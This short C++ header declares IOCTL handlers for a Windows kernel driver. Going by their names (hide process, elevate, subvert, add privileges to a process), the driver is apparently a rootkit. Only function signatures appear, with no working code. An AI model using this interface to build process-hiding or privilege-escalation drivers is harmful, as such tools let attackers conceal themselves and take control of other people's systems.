#pragma once
#include <ntddk.h>

namespace IoctlHandlers {

	NTSTATUS HandleHideProcess(PIRP pIrp);
	NTSTATUS HandleElevate(PIRP pIrp);
	NTSTATUS HandleSubvirt(PIRP pIrp);
	NTSTATUS HandleTestConnection(PIRP pIrp, ULONG bufferSize);
	NTSTATUS AddPrivsToProcess(PIRP);
}
